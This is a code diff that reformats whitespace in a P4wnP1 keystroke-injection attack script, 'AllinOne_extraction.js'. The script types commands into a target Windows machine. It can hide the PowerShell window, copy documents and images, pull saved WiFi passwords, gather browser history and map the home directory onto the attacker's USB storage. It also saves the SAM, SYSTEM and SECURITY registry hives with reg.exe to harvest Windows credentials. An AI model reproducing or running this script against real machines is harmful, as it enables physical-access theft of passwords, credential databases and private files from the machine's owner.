@@ -1,10 +1,10 @@
 /*#########################################################################################################################################\
-# AllinOne_extraction.js														   #
+# AllinOne_extraction.js                                                                                                                   #
 #   Extraction of folder/file structures, targeted files in specified folders, saved wifi Passwords, browsing history/bookmarks/logs       #
-#   and Windows credential databases (SAM, system and security files).									   #
-#																	   #
+#   and Windows credential databases (SAM, system and security files).                                                                     #
+#                                                                                                                                          #
 #   Author: chriskalv                                                                                                                      #
-#													                                   #
+#                                                                                                                                          #
 # PREREQUISTES:                                                                                                                            #
 # - Enable keyboard and USB mass storage capability on your P4wnP1.                                                                        #
 # - Place browser_booty.exe in P4wnP1:\tools in order to be able to extract browser data.                                                  #
@@ -13,30 +13,30 @@
 
 
 ////////////////////////// GLOBAL SETTINGS /////////////////////////\
-// GENERAL							   // ---
-layout("de");			                                   // Keyboard layout
-typingSpeed(0,0);		                                   // Typing = really fast
-run_as_admin=false;					           // Set to true to execute powershell as Administrator (normally not necessary)
-hide=false; 			                                   // Set to true to hide the console window on the target
-exit=true;			                                   // Set to true to exit the console once finished
+// GENERAL                                                         // ---
+layout("de");                                                      // Keyboard layout
+typingSpeed(0,0);                                                  // Typing = really fast
+run_as_admin=false;                                                // Set to true to execute powershell as Administrator (normally not necessary)
+hide=false;                                                        // Set to true to hide the console window on the target
+exit=true;                                                         // Set to true to exit the console once finished
 var usb_drive = "TEMPUSB"                                          // The name of the P4wnP1's USB storage device
-// FILES EXTRACTION              				   // ---
-extract_files=true;						   // Set to true to enable the extraction of files
+// FILES EXTRACTION                                                // ---
+extract_files=true;                                                // Set to true to enable the extraction of files
 extract_add_folder=false;                                          // Set to true to extract files from an additional folder (see 'add_folder' below)
 var user_subfolder1 = ["Documents"]                                // The first folder inside the home user directory to be inspected
 var user_subfolder2 = ["Downloads"]                                // The second folder inside the home user directory to be inspected
 var filetypes_user = ["pdf", "jpg", "png"]                         // The filetypes to extract from previously specified folders in the home directory
 var add_folder = "SoftwareXYZ\\subfolder1\\subfolder2"             // Additional folder inside C:\Program Files (x86)\ that should be inspected for extraction
 var filetypes_addfolder = ["jpg"]                                  // The filetypes to extract from the additional directory
-// WIFI DATA EXTRACTION					           // ---
-extract_wifi=true;						   // Set to true to enable the extraction of WiFi keys
+// WIFI DATA EXTRACTION                                            // ---
+extract_wifi=true;                                                 // Set to true to enable the extraction of WiFi keys
 var key_locale = '\"Schlüsselinhalt\\W+\\:(.+)$\"'                 // String that indicates saved passwords in the Wifi list (e.g. "Schlüsselinhalt" [German], "Key Content" [English])
-// BROWSER DATA EXTRACTION					   // ---
-extract_browserdata=false;					   // Set to true to enable the extraction of browser data (history, bookmarks, logs)
-// HOME DIRECTORY FILES/FOLDER STRUCTURE EXTRACTION		   // ---
-extract_folderstructure=true;					   // Set to true to enable the extraction of the home directory folder/files structure
-// WINDOWS CREDENTIALS EXTRACTION				   // ---
-extract_wincreds=false;						   // Set to true to enable the extraction of Windows credentials dbs (powershell must be run as admin)
+// BROWSER DATA EXTRACTION                                         // ---
+extract_browserdata=false;                                         // Set to true to enable the extraction of browser data (history, bookmarks, logs)
+// HOME DIRECTORY FILES/FOLDER STRUCTURE EXTRACTION                // ---
+extract_folderstructure=true;                                      // Set to true to enable the extraction of the home directory folder/files structure
+// WINDOWS CREDENTIALS EXTRACTION                                  // ---
+extract_wincreds=false;                                            // Set to true to enable the extraction of Windows credentials dbs (powershell must be run as admin)
 ////////////////////////////////////////////////////////////////////
 
 // Definition of other variables, arrays, ...
@@ -60,7 +60,7 @@ function attack() {
     press("GUI r");
     delay(500);
     if (hide) type("powershell -w h -NoP -NonI"); else type("powershell");     // Hide the console if chosen to do so
-    if (run_as_admin) {							       // Run powershell either as admin or standard user
+    if (run_as_admin) {                                                        // Run powershell either as admin or standard user
         press("CTRL SHIFT ENTER");
 	    delay(1000);
         press("LEFT");
@@ -112,7 +112,7 @@ function attack() {
 	
   // Extract Windows credentials
     if (extract_wincreds) && (run_as_admin) {
-	type("reg.exe save hklm\\sam $lootPathWincreds\\SAM;");                // Save the SAM file
+        type("reg.exe save hklm\\sam $lootPathWincreds\\SAM;");                // Save the SAM file
         type("reg.exe save hklm\\system $lootPathWincreds\\System;");          // Save the System file
         type("reg.exe save hklm\\security $lootPathWincreds\\Security;");      // Save Security file
 	delay(4000)
